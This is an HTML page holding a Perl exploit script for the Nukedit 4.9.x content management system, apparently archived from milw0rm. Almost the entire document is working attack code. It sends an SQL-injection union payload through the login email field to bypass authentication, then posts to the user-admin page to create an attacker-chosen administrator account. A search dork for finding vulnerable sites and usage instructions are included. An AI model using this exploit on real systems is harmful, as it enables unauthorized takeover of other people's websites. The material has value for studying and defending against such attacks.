<html><head><title>Nukedit 4.9.x Remote Create Admin Exploit</title></head><pre>#!/usr/bin/perl
###########################################################
#Title:       Nukedit 4.9.x Create Admin Exploit          #
#                                                         #
#Credit:      r3dm0v3                                     #
#             http://r3dm0v3.persianblog.ir               #
#             r3dm0v3[4t]yahoo[dot]com                    #
#             Tehran - Iran                               #
#                                                         #
#Download:    http://www.nukedit.com/content/Download.asp #
#Vulnerables: 4.9.x, prior versions maybe affected.       #
#Remote:      Yes                                         #
#Dork:        &quot;Powered by Nukedit&quot;                        #
#Fix:         Not Available                               #
###########################################################

use LWP::UserAgent;
use HTTP::Cookies;


$host = $ARGV[0];
if (substr($host,length($host)-1,1) ne &quot;/&quot;){
    $host.=&quot;/&quot;;
}
$usrmail = $ARGV[1];
$passwd = $ARGV[2];
$url = &quot;http://&quot;.$host;
$usrSQL= &quot;' union select 1,1,'r3dm0v3',4,'ENCfc2aef9fe5f2c546429e2e1d9fd737e6da5b1b94707518619576129a915d0c2c',6,7,8,9,10,11,12,13,14,15,16,17,18,19,20 from tblusers where 'x'='x&quot;;


&amp;Banner();
if (@ARGV &lt; 3) {
&amp;Usage();
exit(1);
}


print &quot;[~] Host: $host \n&quot;;
print &quot;[~] Email/Password: $usrmail/$passwd\n&quot;;
print &quot;[~] Logging in...\n&quot;;


$xpl = LWP::UserAgent-&gt;new() || die;
$cookie_jar = HTTP::Cookies-&gt;new();

$xpl-&gt;cookie_jar( $cookie_jar );
$res = $xpl-&gt;post($url.'utilities/login.asp',
Content =&gt; [
&quot;redir&quot;        =&gt; &quot;/nukedit/default.asp&quot;,
&quot;email&quot;        =&gt; &quot;$usrSQL&quot;,
&quot;password&quot;     =&gt; &quot;r3dm0v3&quot;,
&quot;savepassword&quot; =&gt; &quot;false&quot;,
&quot;submit&quot;       =&gt; &quot;Login&quot;,
],);



if ($res-&gt;content =~ /Object Moved/){
    print &quot;[+] Logged in\n&quot;;
}else{
    print &quot;[-] Can not login!\n&quot;;
    exit();
}


print &quot;[~] Creating Admin...\n&quot;;


$res = $xpl-&gt;post($url.'utilities/useradmin.asp',
Content =&gt; [
&quot;action&quot;          =&gt; &quot;addDB&quot;,
&quot;username&quot;        =&gt; &quot;r3dm0v3&quot;,
&quot;company&quot;         =&gt; &quot;red move&quot;,
&quot;url&quot;             =&gt; &quot;http://r3dm0v3.persianblog.ir&quot;,
&quot;address&quot;         =&gt; &quot;a&quot;,
&quot;county&quot;          =&gt; &quot;b&quot;,
&quot;zip&quot;             =&gt; &quot;666&quot;,
&quot;country&quot;         =&gt; &quot;Iran&quot;,
&quot;phone&quot;           =&gt; &quot;66666666&quot;,
&quot;fax&quot;             =&gt; &quot;12345678&quot;,
&quot;email&quot;           =&gt; &quot;$usrmail&quot;,
&quot;password&quot;        =&gt; &quot;$passwd&quot;,
&quot;groupid&quot;         =&gt; &quot;1&quot;,
&quot;submit1&quot;         =&gt; &quot;Add User &gt;&gt;&quot;,
&quot;IP&quot;              =&gt; &quot;127.0.0.2&quot;,
],);


if ($res-&gt;content =~ /Object Moved/){
    print &quot;[+] Admin added. Login info:\n&quot;.
          &quot;    email:    $usrmail\n&quot;.
          &quot;    password: $passwd\n&quot;;
}else{
    print &quot;[-] Exploit failed!\n&quot;;
    print $res-&gt;content;
}



sub Banner{
print &quot;############################################################\n&quot;.
      &quot;#            Nukedit 4.9.x Create Admin Exploit            #\n&quot;.
      &quot;#                       by r3dm0v3                         #\n&quot;.
      &quot;#                  r3dm0v3[4t]yahoo[.]com                  #\n&quot;.
      &quot;#               http://r3dm0v3.persianblog.ir              #\n&quot;.
      &quot;############################################################\n&quot;;
}


sub Usage(){
print &quot;\n Usage: nukedit.pl &lt;host&amp;path&gt; &lt;email&gt; &lt;password&gt;\n&quot;;
print &quot; ex.  : nukedit.pl site.com/nukedit/ myname\@somewhere.com 123456\n&quot;;
}

# milw0rm.com [2008-02-26]</pre></html>